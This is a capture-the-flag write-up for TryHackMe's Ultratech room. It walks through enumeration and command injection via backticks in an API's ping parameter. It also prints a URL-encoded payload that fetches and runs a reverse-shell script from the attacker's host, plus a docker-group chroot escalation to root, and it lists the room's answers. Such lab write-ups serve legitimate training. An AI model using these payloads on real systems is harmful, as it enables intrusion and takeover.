---
title: "Ultratech"
date: 2025-09-23
layout: writeup
platform: TryHackMe
categories: [web, pentesting, linux, boot2root]
tags: [web, pentesting, linux, boot2root]
---

# Ultratech

Writeup for the Ultratech room on TryHackMe.

## Enumeration

We start with a simple nmap scan.

```bash
nmap -sS -vv -p- -A 10.10.144.196
```

We were able to find the following information:
21/tcp — FTP (vsftpd 3.0.3)
22/tcp — SSH (OpenSSH 7.6p1 Ubuntu)
8081/tcp — Node.js Express
31331/tcp — Apache HTTPD 2.4.29

Which software is using the port 8081?

> node.js

Which other non-standard port is used?

> 31331

Which software using this port?

> Apache

Which GNU/Linux distribution seems to be used?

> Ubuntu

Then for the next question I used `gobuster` to find endpoints on the web server.

It found 2 endpoints: `/auth` and `/ping`.

The software using the port 8081 is a REST api, how many of its routes are used by the web application?

> 2

## Endpoint /ping

The auth endpoint didn't let us do much without credentials, so I started looking at the `/ping` endpoint.

It threw back an error with trace.

```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

This kind of hinted at the fact that the endpoint was expecting a parameter.
I tried common ones like `host`, `address` and finally `ip` worked.

It gave output of the ping shell command. which meant that it might be vulnerable to command injection.

So I tried different things like inserting `; ls` and `| ls` `$()` etc but none of them worked.

Then I tried using backticks to execute commands and it worked.

Now through basic commands i want able to find all the information for Task 3.

There is a database lying around, what is its filename?

> ultratech.db.sqlite

What is the first user's password hash?

> f357a0c52799563c7c7b76c1e7543a32

Looking up the hash on crackstation.net

What is the password associated with this hash?

> n100906

## Root

Getting a reverse shell was what i was stuck on for some time. I tried a lot of payloads from `revshells.com/` but none of them worked, i believe it was due to the special characters in the payload.

Finally I was able to get a reverse shell using a simple python http server to host my payload (rev.sh) and using wget to download and execute it.

```
http://10.201.48.24:8081/ping?ip=127.0.0.1%0Awget%20http://10.17.28.236:8000/rev.sh%20-O%20/tmp/rev.sh%0Apython3%20/tmp/rev.sh
```

Once I had a shell, I immediately put linpeas on my web server and fetched it on the target to run.

It showed that there was a user called `r00t`.
I rememberd that there was another hash in the database.
I looked it up on crackstation and got the password to the user.

Now came the final step, getting root.
The `r00t` user was part of the `docker` group.

I looked up the existing docker images and was able to start a bash shell as root.

```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

And there we have it, root access.

What are the first 9 characters of the root user's private SSH key?

> MIIEogIBA
